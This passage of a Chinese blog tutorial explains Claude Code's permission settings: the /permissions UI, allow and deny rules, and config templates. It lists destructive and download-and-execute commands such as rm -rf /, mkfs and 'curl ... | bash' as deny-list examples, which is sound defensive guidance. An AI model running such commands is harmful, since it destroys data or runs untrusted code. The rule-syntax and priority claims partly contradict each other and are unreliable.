<li>不设权限 → 不安全,有风险</li>
<li>每次确认 → 太繁琐,效率低</li>
<li><strong>需要</strong>: 智能的权限管理,平衡安全与效率</li>
</ul>
<h3 data-id="heading-4">1.3 高危命令的安全防护</h3>
<p>哪些命令属于"高危命令"?需要特别防护?</p>
<p><strong>高危命令分类</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## 1. 文件删除类(破坏性)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`rm -rf`</span> - 递归强制删除
<span class="hljs-bullet">-</span> <span class="hljs-code">`rm -rf /`</span> - 删除整个系统(致命)
<span class="hljs-bullet">-</span> <span class="hljs-code">`rm -rf ~`</span> - 删除用户目录(致命)
<span class="hljs-bullet">-</span> <span class="hljs-code">`sudo rm -rf`</span> - 以 root 权限删除(超级致命)

<span class="hljs-section">## 2. 磁盘操作类(不可逆)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`mkfs`</span> - 格式化磁盘
<span class="hljs-bullet">-</span> <span class="hljs-code">`dd`</span> - 磁盘克隆/写入(可能覆盖数据)
<span class="hljs-bullet">-</span> <span class="hljs-code">`fdisk`</span> - 磁盘分区(危险)

<span class="hljs-section">## 3. 权限提升类(安全风险)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`sudo`</span> - 超级用户权限
<span class="hljs-bullet">-</span> <span class="hljs-code">`su`</span> - 切换用户
<span class="hljs-bullet">-</span> <span class="hljs-code">`chmod 777`</span> - 开放所有权限(安全漏洞)

<span class="hljs-section">## 4. 网络下载执行类(恶意软件风险)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`curl ... | bash`</span> - 下载并执行脚本
<span class="hljs-bullet">-</span> <span class="hljs-code">`wget ... | sh`</span> - 下载并执行
<span class="hljs-bullet">-</span> <span class="hljs-code">`eval $(curl ...)`</span> - 动态执行远程代码

<span class="hljs-section">## 5. 进程管理类(稳定性)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`kill -9`</span> - 强制杀进程(可能导致数据丢失)
<span class="hljs-bullet">-</span> <span class="hljs-code">`killall`</span> - 批量杀进程
<span class="hljs-bullet">-</span> <span class="hljs-code">`reboot`</span> / <span class="hljs-code">`shutdown`</span> - 重启/关机

<span class="hljs-section">## 6. 系统配置类(影响范围大)</span>
<span class="hljs-bullet">-</span> 修改 <span class="hljs-code">`/etc/passwd`</span> - 用户配置
<span class="hljs-bullet">-</span> 修改 <span class="hljs-code">`/etc/hosts`</span> - 网络配置
<span class="hljs-bullet">-</span> 修改系统服务配置
</code></pre>
<p><strong>防护策略</strong>:</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec6469c813904d50983d1b0c078419ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=EIa%2B%2Fgj%2FUOdpqoaCocXFXRW0u%2BY%3D" alt="04-02-security-levels.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-5">二、Permission 权限管理详解</h2>
<h3 data-id="heading-6">2.1 权限系统的设计理念</h3>
<p>Claude Code 的权限系统基于<strong>白名单 + 黑名单</strong>的双重机制:</p>
<p><strong>设计原则</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 默认策略: 需要确认(安全优先)
<span class="hljs-bullet">2.</span> 白名单: 批量授权安全命令(提升效率)
<span class="hljs-bullet">3.</span> 黑名单: 阻断危险命令(保障安全)
<span class="hljs-bullet">4.</span> 优先级: 黑名单 &gt; 白名单 &gt; 默认策略
</code></pre>
<p><strong>工作流程</strong>:</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10e7305a51974da49d38c23804cd3d33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=%2FjPwYmQWbHbpwczgXqA086mWoLE%3D" alt="04-03-permission-flow.png" loading="lazy"/></p>
<h3 data-id="heading-7">2.2 <code>/permissions</code> 命令使用</h3>
<p><code>/permissions</code> 命令会调出一个交互式 UI 界面，用于查看和配置命令权限。</p>
<h4 data-id="heading-8">启动权限管理界面</h4>
<p>在 Claude Code 交互式终端中输入：</p>
<pre><code class="hljs language-bash" lang="bash">&gt; /permissions
</code></pre>
<p>这会打开权限管理界面，显示当前已配置的权限规则。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd2c62601991420285c5b5a55712624b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=eVmGena2lhbyFK636%2F40B%2F5JMA8%3D" alt="04-04-permissions-command-ui.png" loading="lazy"/></p>
<h4 data-id="heading-9">权限类别</h4>
<p>界面顶部显示三种权限类别，可以通过 <strong>←/→</strong> 或 <strong>Tab</strong> 键切换：</p>
<ul>
<li><strong>Allow</strong> - 允许使用：添加到该类的命令可以直接执行，无需确认</li>
<li><strong>Ask</strong> - 每次询问：使用该命令时会弹出确认对话框</li>
<li><strong>Deny</strong> - 禁止使用：该命令被完全阻止，无法执行</li>
<li><strong>Workspace</strong> - 工作区配置：项目级别的权限设置</li>
</ul>
<h4 data-id="heading-10">查看已配置的权限</h4>
<ol>
<li>使用 <strong>←/→</strong> 或 <strong>Tab</strong> 键切换到对应的权限类别（Allow/Ask/Deny）</li>
<li>界面会显示该类别下所有已添加的命令规则</li>
<li>使用 <strong>↑/↓</strong> 键可以浏览规则列表</li>
</ol>
<p><strong>命令格式示例</strong>:</p>
<ul>
<li><code>Bash(curl:*)</code> - Bash 命令，支持通配符</li>
<li><code>Bash(docker exec:*)</code> - Docker 命令</li>
<li><code>Bash(ls:*)</code> - 文件列表命令</li>
<li><code>mcp__pencil</code> - 第三方 MCP 工具命令</li>
<li><code>WebFetch</code> - Claude Code 内置命令</li>
</ul>
<h4 data-id="heading-11">添加权限规则</h4>
<ol>
<li>切换到目标权限类别（Allow/Ask/Deny）</li>
<li>在规则列表顶部选择 <strong>"Add a new rule..."</strong>（通常是列表第一项）</li>
<li>按 <strong>Enter</strong> 确认</li>
<li>输入命令名称，支持的格式包括：
<ul>
<li><strong>Bash 命令</strong>: <code>Bash(命令名:参数)</code>，例如：
<ul>
<li><code>Bash(cat:*)</code> - 允许所有 cat 命令</li>
<li><code>Bash(git:status)</code> - 只允许 git status</li>
<li><code>Bash(npm:*)</code> - 允许所有 npm 命令</li>
</ul>
</li>
<li><strong>Claude Code 内置命令</strong>: 直接输入命令名，如 <code>WebFetch</code></li>
<li><strong>第三方工具命令</strong>: 直接输入命令名，如 <code>mcp__pencil</code></li>
</ul>
</li>
<li>按 <strong>Enter</strong> 确认添加</li>
</ol>
<h4 data-id="heading-12">删除权限规则</h4>
<ol>
<li>使用 <strong>↑/↓</strong> 键选中要删除的规则</li>
<li>按 <strong>Enter</strong> 键</li>
<li>会弹出删除确认对话框："Delete allowed tool?" 或类似提示</li>
<li>选择 <strong>"Yes"</strong> 确认删除，或 <strong>"No"</strong> 取消</li>
<li>按 <strong>Esc</strong> 可以随时取消操作</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6de8903e9166458c8a802ae35d9a1887~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=2PFhRL5s6WHpZWOx9DJnA3%2FaMAo%3D" alt="04-05-permissions-delete.png" loading="lazy"/></p>
<h4 data-id="heading-13">搜索命令</h4>
<ul>
<li>界面顶部有 <strong>Search</strong> 搜索框</li>
<li>直接输入关键字即可过滤显示匹配的命令规则</li>
<li>支持模糊搜索，方便在大量规则中快速定位</li>
</ul>
<h4 data-id="heading-14">导航快捷键</h4>
<ul>
<li><strong>↑/↓</strong> - 上下导航规则列表</li>
<li><strong>←/→</strong> 或 <strong>Tab</strong> - 切换权限类别（Allow/Ask/Deny）</li>
<li><strong>Enter</strong> - 选择/确认操作</li>
<li><strong>Esc</strong> - 取消操作/退出界面</li>
<li><strong>输入文字</strong> - 在搜索框中搜索</li>
</ul>
<h3 data-id="heading-15">2.3 权限配置文件</h3>
<p>权限配置可以持久化到配置文件中,无需每次手动设置。我更推荐通过配置文件的方式修改，可以实现批量可复制的配置，避免一个个手动添加。</p>
<p><strong>全局配置</strong> (~/.claude/settings.json):</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(cat:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(ls:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(grep:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:status)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:log:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:diff:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(npm:test)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(npm:run:lint)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(rm:-rf:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(sudo:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(mkfs:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(dd:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(curl:*:|:bash)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(wget:*:|:sh)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(reboot)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(shutdown:*)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>项目级配置</strong> (项目根目录/.claude/settings.json 或 .claude/settings.local.json):</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(npm:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(yarn:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:ps)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:logs:*)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(docker:rm:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:rmi:*)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>配置优先级</strong>:</p>
<pre><code class="hljs language-makefile" lang="makefile">项目配置 &gt; 全局配置 &gt; 默认策略

<span class="hljs-section">示例:</span>
  全局配置: deny <span class="hljs-string">"sudo *"</span>
  项目配置: allow <span class="hljs-string">"sudo npm install"</span>
  最终结果: 项目中允许 <span class="hljs-string">"sudo npm install"</span>,其他 sudo 命令仍被阻断
</code></pre>
<h3 data-id="heading-16">2.4 权限的作用域与持久化</h3>
<p><strong>作用域</strong>:</p>

























<table><thead><tr><th align="left">配置类型</th><th align="left">作用域</th><th align="left">配置文件</th></tr></thead><tbody><tr><td align="left"><strong>全局配置</strong></td><td align="left">所有项目</td><td align="left"><code>~/.claude/settings.json</code></td></tr><tr><td align="left"><strong>项目配置</strong></td><td align="left">当前项目</td><td align="left"><code>&lt;项目根&gt;/.claude/settings.json</code> 或 <code>.claude/settings.local.json</code></td></tr><tr><td align="left"><strong>会话配置</strong></td><td align="left">当前会话</td><td align="left">仅内存中,退出失效</td></tr></tbody></table>
<p><strong>持久化策略</strong>:</p>
<p>通过 <code>/permissions</code> 界面配置的权限规则会自动保存：</p>
<ol>
<li><strong>全局配置</strong>: 保存在 <code>~/.claude/settings.json</code>，所有项目生效</li>
<li><strong>项目配置</strong>: 保存在 <code>&lt;项目根&gt;/.claude/settings.local.json</code>，仅当前项目生效</li>
<li><strong>工作区配置</strong>: 通过 <strong>Workspace</strong> 类别配置，项目级别生效</li>
</ol>
<h3 data-id="heading-17">2.5 最佳实践配置参考清单</h3>
<p>在了解了权限配置的作用域和持久化机制后，以下是一份实用的配置参考清单，帮助你快速配置常用命令的权限。</p>
<h4 data-id="heading-18">2.5.1 Allow 类别推荐配置（安全命令白名单）</h4>
<p>以下是一些常用的安全命令，建议添加到 <strong>Allow</strong> 类别中，以便直接执行无需确认：</p>
<p><strong>文件查看类（只读操作，安全）</strong></p>
<ul>
<li><code>Bash(cat:*)</code> - 查看文件内容</li>
<li><code>Bash(less:*)</code> - 分页查看文件</li>
<li><code>Bash(head:*)</code> - 查看文件开头</li>
<li><code>Bash(tail:*)</code> - 查看文件末尾</li>
</ul>
<p><strong>文件列表类（只读，安全）</strong></p>
<ul>
<li><code>Bash(ls:*)</code> - 列出目录内容</li>
<li><code>Bash(tree:*)</code> - 树形显示目录结构</li>
<li><code>Bash(find:*)</code> - 查找文件</li>
</ul>
<p><strong>文本搜索类（只读，安全）</strong></p>
<ul>
<li><code>Bash(grep:*)</code> - 文本搜索</li>
<li><code>Bash(rg:*)</code> - ripgrep 快速搜索</li>
<li><code>Bash(ag:*)</code> - The Silver Searcher</li>
</ul>
<p><strong>Git 查看类（只读，安全）</strong></p>
<ul>
<li><code>Bash(git:status)</code> - 查看 Git 状态</li>
<li><code>Bash(git:log:*)</code> - 查看提交历史</li>
<li><code>Bash(git:diff:*)</code> - 查看差异</li>
<li><code>Bash(git:show:*)</code> - 查看提交详情</li>
<li><code>Bash(git:branch)</code> - 查看分支</li>
</ul>
<p><strong>进程查看类（只读，安全）</strong></p>
<ul>
<li><code>Bash(ps:*)</code> - 查看进程</li>
<li><code>Bash(top)</code> - 实时进程监控</li>
<li><code>Bash(htop)</code> - 增强版进程监控</li>
</ul>
<p><strong>网络查看类（只读，安全）</strong></p>
<ul>
<li><code>Bash(ping:*)</code> - 网络连通性测试</li>
<li><code>Bash(curl:--head:*)</code> - 只获取 HTTP header，不下载内容</li>
</ul>
<p><strong>配置方式</strong>:</p>
<ol>
<li>
<p><strong>通过 <code>/permissions</code> 界面添加</strong>:</p>
<ul>
<li>输入 <code>/permissions</code> 打开权限管理界面</li>
<li>切换到 <strong>Allow</strong> 类别</li>
<li>选择 "Add a new rule..."</li>
<li>依次输入上述命令格式（如 <code>Bash(cat:*)</code>）</li>
<li>按 Enter 确认添加</li>
</ul>
</li>
<li>
<p><strong>通过配置文件批量添加</strong>（推荐）:</p>
<ul>
<li>编辑 <code>~/.claude/settings.json</code> 或 <code>.claude/settings.local.json</code></li>
<li>在 <code>permissions.allow</code> 数组中添加上述命令</li>
<li>保存后配置自动生效</li>
</ul>
</li>
</ol>
<h4 data-id="heading-19">2.5.2 Deny 类别推荐配置（高危命令黑名单）</h4>
<p>建议将以下危险命令添加到 <strong>Deny</strong> 类别中，完全阻止执行：</p>
<p><strong>文件删除类（破坏性）</strong></p>
<ul>
<li><code>Bash(rm:-rf:*)</code> - 递归删除文件</li>
<li><code>Bash(rm:-rf:/)</code> - 删除根目录（极其危险）</li>
<li><code>Bash(rm:-rf:~)</code> - 删除用户主目录</li>
<li><code>Bash(sudo:rm:*)</code> - 使用 sudo 删除文件</li>
</ul>
<p><strong>磁盘操作类（不可逆）</strong></p>
<ul>
<li><code>Bash(mkfs:*)</code> - 格式化文件系统</li>
<li><code>Bash(dd:*)</code> - 磁盘复制（可能覆盖数据）</li>
<li><code>Bash(fdisk:*)</code> - 磁盘分区工具</li>
</ul>
<p><strong>权限提升类（安全风险）</strong></p>
<ul>
<li><code>Bash(sudo:*)</code> - 所有 sudo 命令</li>
<li><code>Bash(su:*)</code> - 切换用户</li>
<li><code>Bash(chmod:777:*)</code> - 设置危险权限</li>
</ul>
<p><strong>网络下载执行类（恶意软件风险）</strong></p>
<ul>
<li><code>Bash(curl:*:|:bash)</code> - 下载并执行脚本</li>
<li><code>Bash(curl:*:|:sh)</code> - 下载并执行 shell 脚本</li>
<li><code>Bash(wget:*:|:bash)</code> - wget 下载并执行</li>
<li><code>Bash(wget:*:|:sh)</code> - wget 下载并执行 shell</li>
</ul>
<p><strong>系统关键操作（危险）</strong></p>
<ul>
<li><code>Bash(reboot)</code> - 重启系统</li>
<li><code>Bash(shutdown:*)</code> - 关闭系统</li>
<li><code>Bash(init:0)</code> - 系统关机</li>
</ul>
<p><strong>配置方式</strong>:</p>
<ol>
<li>
<p><strong>通过 <code>/permissions</code> 界面添加</strong>:</p>
<ul>
<li>输入 <code>/permissions</code> 打开权限管理界面</li>
<li>切换到 <strong>Deny</strong> 类别</li>
<li>选择 "Add a new rule..."</li>
<li>依次输入上述命令格式（如 <code>Bash(rm:-rf:*)</code>）</li>
<li>按 Enter 确认添加</li>
</ul>
</li>
<li>
<p><strong>通过配置文件批量添加</strong>（推荐）:</p>
<ul>
<li>编辑 <code>~/.claude/settings.json</code> 或 <code>.claude/settings.local.json</code></li>
<li>在 <code>permissions.deny</code> 数组中添加上述命令</li>
<li>保存后配置自动生效</li>
</ul>
</li>
</ol>
<p><strong>注意</strong>: 命令格式中使用冒号 <code>:</code> 分隔命令和参数，而不是空格。例如 <code>Bash(rm:-rf:*)</code> 表示 <code>rm -rf *</code> 命令。</p>
<hr/>
<h2 data-id="heading-20">三、常见问题与调试技巧</h2>
<h3 data-id="heading-21">3.1 权限配置不生效</h3>
<p><strong>问题</strong>: 配置了白名单,但 AI 仍然要求确认</p>
<p><strong>排查步骤</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 检查配置文件是否存在</span>
<span class="hljs-built_in">ls</span> -la ~/.claude/settings.json
<span class="hljs-built_in">ls</span> -la ./.claude/settings.local.json

<span class="hljs-comment"># 2. 检查 JSON 格式是否正确</span>
jq . ~/.claude/settings.json
jq . ./.claude/settings.local.json

<span class="hljs-comment"># 3. 查看当前生效的权限</span>
<span class="hljs-comment"># 在 Claude Code 交互式终端中输入:</span>
&gt; /permissions
<span class="hljs-comment"># 然后切换到 Allow/Ask/Deny 类别查看对应权限规则</span>

<span class="hljs-comment"># 4. 检查命令模式是否匹配</span>
<span class="hljs-comment"># 例如: 配置了 "npm test" 但实际执行 "npm test --verbose"</span>
<span class="hljs-comment"># 解决: 改为 "Bash(npm:test:*)" 或 "Bash(npm:test:*)"</span>
</code></pre>
<p><strong>常见错误</strong>:</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// ❌ 错误: 模式不匹配</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"Bash(git:status)"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
<span class="hljs-comment">// AI 执行: git status -sb (不匹配)</span>

<span class="hljs-comment">// ✅ 正确: 使用通配符</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"Bash(git:status:*)"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-22">3.2 配置文件格式错误</h3>
<p><strong>问题</strong>: 配置文件格式不正确,导致权限无法加载</p>
<p><strong>排查步骤</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 使用 jq 验证 JSON 格式</span>
jq . ~/.claude/settings.json

<span class="hljs-comment"># 2. 检查命令格式是否正确</span>
<span class="hljs-comment"># 正确格式: "Bash(命令:参数)"</span>
<span class="hljs-comment"># 错误格式: "bash command" 或 "Bash(command param)"</span>
</code></pre>
<hr/>
<h2 data-id="heading-23">四、总结与最佳实践</h2>
<h3 data-id="heading-24">4.1 核心要点回顾</h3>
<p>通过本文,我们深入探讨了 Claude Code 的权限管理系统:</p>
<p><strong>权限管理(Permission)</strong></p>
<ul>
<li><strong>必要性</strong>: 平衡安全与效率,既防止危险操作,又避免重复确认</li>
<li><strong>机制</strong>: 白名单 + 黑名单 + 默认策略</li>
<li><strong>配置</strong>: 全局配置 + 项目配置,优先级明确</li>
<li><strong>实践</strong>: 批量授权安全命令,阻断危险操作</li>
</ul>
<p><strong>金句回顾</strong>:</p>
<blockquote>
<p>"Permission 权限管理:既保障安全,又使用丝滑"</p>
</blockquote>
<h3 data-id="heading-25">4.2 最佳实践清单</h3>
<p><strong>权限配置最佳实践</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown">✅ DO(推荐做法)
<span class="hljs-bullet">-</span> 批量授权常用安全命令(cat、ls、grep、git status 等)
<span class="hljs-bullet">-</span> 阻断高危命令(rm -rf、sudo、mkfs、dd 等)
<span class="hljs-bullet">-</span> 项目配置提交到 Git,团队共享
<span class="hljs-bullet">-</span> 定期回顾和更新权限规则
<span class="hljs-bullet">-</span> 使用模式匹配而不是精确匹配(灵活性)

❌ DON'T(避免的做法)
<span class="hljs-bullet">-</span> 一刀切禁止所有命令(影响效率)
<span class="hljs-bullet">-</span> 白名单包含危险命令(安全隐患)
<span class="hljs-bullet">-</span> 忘记配置权限持久化(每次重新设置)
<span class="hljs-bullet">-</span> 过于复杂的模式匹配(难以维护)
</code></pre>
<p><strong>安全配置最佳实践</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown">✅ DO(推荐做法)
<span class="hljs-bullet">-</span> 黑名单优先级高于白名单
<span class="hljs-bullet">-</span> 危险命令完全禁止,不提供确认选项
<span class="hljs-bullet">-</span> 定期审计 AI 执行的命令
<span class="hljs-bullet">-</span> 配置文件权限设置为 600(仅自己可读写)

❌ DON'T(避免的做法)
<span class="hljs-bullet">-</span> 为了方便将所有命令加入白名单
<span class="hljs-bullet">-</span> 忽略权限配置的安全警告
<span class="hljs-bullet">-</span> 使用明文存储敏感信息
</code></pre>
<h3 data-id="heading-26">4.3 快速配置指南</h3>
<p><strong>第 1 步: 创建配置文件(今天完成)</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 创建目录</span>
<span class="hljs-built_in">mkdir</span> -p ~/.claude

<span class="hljs-comment"># 2. 创建全局配置文件</span>
<span class="hljs-built_in">cat</span> &gt; ~/.claude/settings.json &lt;&lt; <span class="hljs-string">EOF
{
  "permissions": {
    "allow": [
      "Bash(cat:*)",
      "Bash(ls:*)",
      "Bash(grep:*)",
      "Bash(git:status)",
      "Bash(git:log:*)",
      "Bash(git:diff:*)"
    ],
    "deny": [
      "Bash(rm:-rf:*)",
      "Bash(sudo:*)",
      "Bash(mkfs:*)"
    ]
  }
}
EOF</span>
</code></pre>
<p><strong>第 2 步: 验证配置(今天完成)</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 启动 Claude Code</span>
claude

<span class="hljs-comment"># 2. 查看权限配置</span>
&gt; /permissions
<span class="hljs-comment"># 打开权限管理界面，切换到 Allow/Ask/Deny 类别查看对应权限</span>

<span class="hljs-comment"># 3. 测试安全命令(应该直接执行,无需确认)</span>
&gt; 查看 README.md

<span class="hljs-comment"># 4. 测试危险命令拦截</span>
&gt; 执行 <span class="hljs-built_in">rm</span> -rf <span class="hljs-built_in">test</span>
<span class="hljs-comment"># [应该被阻断]</span>
</code></pre>
<h3 data-id="heading-27">4.4 常见配置模板</h3>
<p><strong>模板 1: Web 开发项目</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(npm:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(yarn:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(pnpm:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:status)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:log:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:diff:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:ps)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:logs:*)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(npm:publish)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:rm:*)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>模板 2: Android 开发项目</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(./gradlew:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(adb:logcat)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(adb:shell:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:status)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:log:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:diff:*)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(adb:uninstall:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(adb:shell:rm:*)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>模板 3: Python 数据科学项目</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(python:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(pip:install:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(jupyter:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(pytest:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(black:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(flake8:*)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(pip:uninstall:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(rm:-rf:venv)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h2 data-id="heading-28">参考资料</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fcli-reference" target="_blank" title="https://code.claude.com/docs/zh-CN/cli-reference" ref="nofollow noopener noreferrer">Claude Code CLI 参考</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fiam" target="_blank" title="https://code.claude.com/docs/zh-CN/iam" ref="nofollow noopener noreferrer">Claude Code 身份和访问管理</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgoogle.github.io%2Fstyleguide%2Fshellguide.html" target="_blank" title="https://google.github.io/styleguide/shellguide.html" ref="nofollow noopener noreferrer">Bash Scripting Best Practices</a></li>
</ul>
<hr/>
<blockquote>
